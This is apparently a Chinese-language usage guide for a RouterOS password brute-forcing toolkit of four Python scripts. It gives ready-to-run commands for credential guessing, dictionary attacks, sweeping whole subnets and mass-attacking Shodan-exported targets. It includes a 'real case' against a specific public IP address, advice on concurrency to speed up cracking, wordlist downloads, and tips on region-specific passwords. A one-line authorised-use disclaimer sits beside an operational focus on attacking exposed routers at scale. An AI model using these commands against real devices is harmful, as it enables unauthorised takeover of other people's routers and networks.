# RouterOS 爆破工具包使用指南

## 🔥 可用的爆破工具

### 1. routeros_ultimate_brute.py - 终极自动爆破工具

**特点：**
- ✅ 自动检测目标类型（WebFig/WinBox/API）
- ✅ 自动选择最佳攻击方式
- ✅ 内置28个常用凭据
- ✅ 支持并发模式
- ✅ 支持多种协议

**使用方法：**
```bash
# 基本用法
python3 routeros_ultimate_brute.py http://192.168.1.1

# 并发模式（推荐）
python3 routeros_ultimate_brute.py http://192.168.1.1 --parallel --workers 20

# 指定方法
python3 routeros_ultimate_brute.py http://192.168.1.1 --method basic_auth
```

**输出示例：**
```
[*] 检测目标: http://192.168.1.1
[+] HTTP 200
[+] 检测到: RouterOS WebFig
[+] 检测到: WinBox端口 8291 开放

[*] 尝试方法: WEBFIG
  [*] admin:(空密码) ... ✓ 成功!

============================================================
成功破解!
============================================================
目标:   http://192.168.1.1
方法:   WEBFIG
用户名: admin
密码:   
============================================================
```

---

### 2. routeros_dict_brute.py - 字典爆破工具

**特点：**
- ✅ 支持自定义用户名/密码字典
- ✅ 支持单个用户名 + 密码列表
- ✅ 并发爆破
- ✅ 进度显示
- ✅ 结果保存

**使用方法：**
```bash
# 使用字典文件
python3 routeros_dict_brute.py http://target -u users.txt -p passwords.txt

# 单用户名 + 密码列表
python3 routeros_dict_brute.py http://target -U admin -P "pass1,pass2,pass3"

# 并发模式
python3 routeros_dict_brute.py http://target -u users.txt -p pass.txt --parallel -w 20

# 保存结果
python3 routeros_dict_brute.py http://target -u users.txt -p pass.txt -o results.json
```

**字典文件格式：**
```
# users.txt
admin
root
user
administrator

# passwords.txt
password
admin
12345
P@ssw0rd
mikrotik
```

---

### 3. mass_routeros_attack.py - 批量攻击工具

**特点：**
- ✅ 批量攻击多个目标
- ✅ 从文件读取目标列表
- ✅ 并发攻击
- ✅ 自动保存结果

**使用方法：**
```bash
# 批量攻击
python3 mass_routeros_attack.py -f targets.txt -w 10
```

**targets.txt格式：**
```
http://192.168.1.1
http://192.168.1.2
http://10.0.0.1
```

---

### 4. routeros_webfig_brute.py - HTTP Basic Auth 专用

**特点：**
- ✅ 针对HTTP Basic Auth优化
- ✅ 快速爆破
- ✅ 适用于旧版本RouterOS

**使用方法：**
```bash
python3 routeros_webfig_brute.py http://target
```

---

## 📊 选择哪个工具？

### 快速决策树

```
是否知道目标类型？
├─ 否 → 使用 routeros_ultimate_brute.py（自动检测）
└─ 是
   ├─ HTTP Basic Auth → routeros_webfig_brute.py
   ├─ 有大字典 → routeros_dict_brute.py
   └─ 批量目标 → mass_routeros_attack.py
```

### 推荐组合

**场景1：单个目标，不知道类型**
```bash
python3 routeros_ultimate_brute.py http://target --parallel -w 20
```

**场景2：确定是HTTP Basic Auth，有大字典**
```bash
python3 routeros_dict_brute.py http://target -u users.txt -p rockyou.txt --parallel -w 50
```

**场景3：批量扫描某个网段**
```bash
# 先生成目标列表
for i in {1..254}; do echo "http://192.168.1.$i"; done > targets.txt

# 批量攻击
python3 mass_routeros_attack.py -f targets.txt -w 20
```

---

## 🎯 实战案例

### 案例1：快速检测默认凭据
```bash
python3 routeros_ultimate_brute.py http://203.189.136.83
```

### 案例2：深度字典爆破
```bash
# 准备字典
cat > passwords.txt << EOF
admin
password
mikrotik
router
secret
P@ssw0rd
admin123
root123
EOF

# 执行爆破
python3 routeros_dict_brute.py http://target -U admin -p passwords.txt --parallel
```

### 案例3：批量扫描Shodan结果
```bash
# 假设从Shodan导出了目标列表
python3 mass_routeros_attack.py -f shodan_results.txt -w 30 -o success.json
```

---

## ⚡ 性能优化

### 并发设置建议

| 目标数量 | 推荐并发数 | 命令 |
|---------|-----------|------|
| 单个目标 | 10-20 | `--parallel -w 20` |
| 10个目标 | 5-10 | `-w 10` |
| 100+目标 | 20-50 | `-w 50` |

### 速度对比

```
串行模式: ~1次/秒
并发10线程: ~10次/秒
并发50线程: ~40-50次/秒（网络限制）
```

---

## 🛡️ 注意事项

1. **仅用于授权测试** - 未经授权的攻击是违法的
2. **速率限制** - 某些RouterOS有防爆破机制，注意调整并发数
3. **日志记录** - RouterOS会记录失败的登录尝试
4. **网络稳定性** - 确保网络稳定，避免误判

---

## 📝 常见问题

**Q: 为什么所有凭据都失败？**
A: 可能原因：
1. 目标已修改默认密码（需要大字典）
2. 有防爆破机制（降低并发数）
3. 网络问题（检查连通性）

**Q: 如何获取大密码字典？**
A: 
```bash
# rockyou.txt
wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

# 自定义生成
crunch 4 8 -t @@@@%%%% > custom.txt
```

**Q: 如何提高成功率？**
A:
1. 使用更大的字典
2. 针对目标地区定制密码（如：cambodia、khmer等）
3. 尝试多种攻击方式
4. 检查是否有已知漏洞

---

## 🎓 总结

**可用的爆破工具：**
1. ✅ routeros_ultimate_brute.py - 自动化终极工具
2. ✅ routeros_dict_brute.py - 字典爆破
3. ✅ mass_routeros_attack.py - 批量攻击
4. ✅ routeros_webfig_brute.py - Basic Auth专用

**都能正常工作！** 选择合适的工具即可开始渗透测试。
